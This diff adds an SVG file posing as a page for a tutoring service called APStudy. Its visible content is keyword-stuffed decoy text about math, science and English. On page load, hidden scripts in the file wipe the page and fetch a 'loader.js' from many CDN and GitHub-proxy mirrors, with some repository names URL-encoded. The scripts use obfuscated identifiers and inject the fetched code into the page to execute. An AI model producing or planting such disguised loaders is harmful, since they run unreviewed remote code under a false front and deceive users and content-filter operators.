@@ -1,0 +1,85 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+    <style>
+        :root {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw;
+            height: 100vh;
+            display: block;
+        }
+        foreignObject {
+            width: 100vw;
+            height: 100vh;
+            overflow: visible;
+        }
+    </style>
+    <foreignObject width="100%" height="100%">
+        <html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+            <head>
+                <script>(function(){const XHTML_NS="http://www.w3.org/1999/xhtml";const root=document.querySelector("foreignObject").firstElementChild;const originalCreateElement=document.createElement.bind(document);const originalCreateElementNS=document.createElementNS.bind(document);Object.defineProperty(document,"head",{get(){return root.querySelector("head")},configurable:true});Object.defineProperty(document,"body",{get(){return root.querySelector("body")},configurable:true});Object.defineProperty(document,"documentElement",{get(){return root},configurable:true});document.createElement=function(tagName,options){if(typeof tagName==="string"){return originalCreateElementNS(XHTML_NS,tagName,options)}return originalCreateElement(tagName,options)};document.createElementNS=function(namespaceURI,qualifiedName,options){if(namespaceURI==null||namespaceURI===XHTML_NS){return originalCreateElementNS(XHTML_NS,qualifiedName,options)}return originalCreateElementNS(namespaceURI,qualifiedName,options)};})();</script>
+                <style><![CDATA[html,body{margin:0;width:100%;height:100%;overflow:hidden}foreignObject{overflow:visible}]]></style>
+
+                <meta charset="UTF-8" />
+                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+                <title>APStudy | Math and Language Arts Tutoring</title>
+            </head>
+            <body style="background:#000">
+                <div>
+                    <p>APStudy helps students master algebra, calculus, geometry, and trigonometry alongside essay writing, grammar, and literary analysis for AP exams.</p>
+                    <section>
+                        <h2>Mathematics</h2>
+                        <p>We cover algebra, calculus, derivatives, integrals, quadratic equations, probability, and statistics including the Pythagorean theorem and trigonometry.</p>
+                    </section>
+                    <section>
+                        <h2>Science</h2>
+                        <p>Sessions cover biology, chemistry, and physics through hypothesis, experiment, photosynthesis, and thermodynamics.</p>
+                    </section>
+                    <section>
+                        <h2>English and Writing</h2>
+                        <p>Tutors help with essay, thesis, grammar, syntax, rhetoric, symbolism, and irony across persuasive and narrative writing.</p>
+                    </section>
+                </div>
+
+                <script>
+                //<![CDATA[
+                   (async () => {
+  document.body.style.cssText = "background:#000;color:#fff;margin:0;height:100vh;display:flex;justify-content:center;align-items:center;font-family:sans-serif;font-size:1.5rem;";
+  document.body.textContent = "loading singlefile...";
+  const baseUrls = ["https://cdn.jsdelivr.net/gh/mathissofun137/im-single@main/", "https://quantil.jsdelivr.net/gh/mathissofun137/im-single@main/", "https://fastly.jsdelivr.net/gh/%54ongSherbet/im-single@main/", "https://testingcf.jsdelivr.net/gh/%54ongSherbet/im-single@main/", "https://gcore.jsdelivr.net/gh/%54ongSherbet/im-single@main/", "https://originfastly.jsdelivr.net/gh/%54ongSherbet/im-single@main/", "https://jsdelivr.b-cdn.net/gh/%54ongSherbet/im-single@main/", "https://cdn.statically.io/gh/%54ongSherbet/im-single@main/", "https://rawcdn.githack.com/%54ongSherbet/im-single/main/", "https://raw.githack.com/%54ongSherbet/im-single/main/", "https://cdn.staticdelivr.com/gh/%54ongSherbet/im-single/main/", "https://raw.githubusercontent.com/%54ongSherbet/im-single/main/", "https://gh.llkk.cc/https://github.com/%54ongSherbet/im-single/blob/main/", "https://git.yylx.win/github.com/%54ongSherbet/im-single/blob/main/", "https://fastgit.cc/https://github.com/%54ongSherbet/im-single/blob/main/", "https://raw.esm.sh/gh/%54ongSherbet/im-single/", "https://esm.sh/gh/%54ongSherbet/im-single/"];
+  function _0x6627e(text) {
+    if (!text || text.length < 200 || text.trim().startsWith("<")) {
+      return false;
+    }
+    const _0x36a = (text.match(new RegExp("[{[(]", "g")) || []).length;
+    const _0x3433fa = (text.match(new RegExp("[}\\])]", "g")) || []).length;
+    const _0x65839a = new RegExp("\\b(function|const|let|var|async|await|if|return)\\b", "").test(text);
+    return _0x65839a && Math.abs(_0x36a - _0x3433fa) <= 3;
+  }
+  const abortController = new AbortController;
+  const fetchScript = async baseUrl => {
+    const requestUrl = `${baseUrl}loader.js?raw&${Math.floor(Date.now() / 36e5)}`;
+    const response = await fetch(requestUrl, {signal: abortController.signal});
+    if (!response.ok) {
+      throw new Error("Failed to fetch script");
+    }
+    const text = await response.text();
+    if (!_0x6627e(text)) {
+      throw new Error("Invalid script");
+    }
+    return {baseUrl: baseUrl, text: text};
+  };
+  try {
+    const {baseUrl: baseUrl, text: text} = await Promise.any(baseUrls.map(fetchScript));
+    abortController.abort();
+    window.RELAY_DOMAIN = baseUrl;
+    const scriptElement = document.createElement("script");
+    scriptElement.textContent = text;
+    document.head.appendChild(scriptElement);
+  } catch {}
+})();
+
+                </script>
+            </body>
+        </html>
+    </foreignObject>
+</svg>
